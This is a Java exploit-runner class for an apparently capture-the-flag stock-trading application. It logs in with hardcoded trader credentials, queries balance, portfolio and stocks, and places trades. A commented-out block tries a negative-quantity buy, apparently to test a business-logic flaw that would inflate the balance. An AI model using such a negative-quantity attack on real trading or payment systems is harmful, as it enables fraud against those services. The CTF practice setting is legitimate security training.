package com.ctf.stockapp.client;

import com.ctf.stockapp.client.network.ServerConnection;
import com.ctf.stockapp.common.model.Stock;
import com.ctf.stockapp.common.protocol.*;

public class ExploitRunner {
    public static void main(String[] args) throws Exception {
        System.setProperty("stockapp.debug", "true");
        ServerConnection connection = new ServerConnection();
        LoginRequest login = new LoginRequest("trader", "trader123");
        Response response = connection.sendRequest(login);
        System.out.println("Login success: " + response.isSuccess());
        System.out.println("Message: " + response.getMessage());
        System.out.println("Data: " + response.getData());

        String token = (String) response.getData();

        GetBalanceRequest balanceRequest = new GetBalanceRequest();
        balanceRequest.setSessionToken(token);
        Response balanceResponse = connection.sendRequest(balanceRequest);
        System.out.println("Balance success: " + balanceResponse.isSuccess());
        System.out.println("Balance: " + balanceResponse.getData());

        GetPortfolioRequest portfolioRequest = new GetPortfolioRequest();
        portfolioRequest.setSessionToken(token);
        Response portfolioResponse = connection.sendRequest(portfolioRequest);
        System.out.println("Portfolio success: " + portfolioResponse.isSuccess());
        System.out.println("Portfolio: " + portfolioResponse.getData());

        GetStocksRequest stocksRequest = new GetStocksRequest();
        stocksRequest.setSessionToken(token);
        Response stocksResponse = connection.sendRequest(stocksRequest);
        System.out.println("Stocks success: " + stocksResponse.isSuccess());
        System.out.println("Stocks data type: " + stocksResponse.getData().getClass());
        @SuppressWarnings("unchecked")
        java.util.ArrayList<Stock> stocks =
            (java.util.ArrayList<Stock>) stocksResponse.getData();
        for (Stock stock : stocks) {
            System.out.println(stock.getSymbol() + " " + stock.getName() + " $" + stock.getPrice());
        }

        BuyRequest buy = new BuyRequest("MSFT", 1);
        buy.setSessionToken(token);
        Response buyResp = connection.sendRequest(buy);
        System.out.println("Buy response: " + buyResp.getMessage());

        SellRequest sell = new SellRequest("GOOGL", 1);
        sell.setSessionToken(token);
        Response sellResp = connection.sendRequest(sell);
        System.out.println("Sell response: " + sellResp.getMessage());

        // BuyRequest buy = new BuyRequest("AAPL", -10);
        // buy.setSessionToken(token);
        // Response buyResp = connection.sendRequest(buy);
        // System.out.println("Buy success: " + buyResp.isSuccess());
        // System.out.println("Buy message: " + buyResp.getMessage());

        // balanceResponse = connection.sendRequest(balanceRequest);
        // System.out.println("Balance after: " + balanceResponse.getData());
    }
}
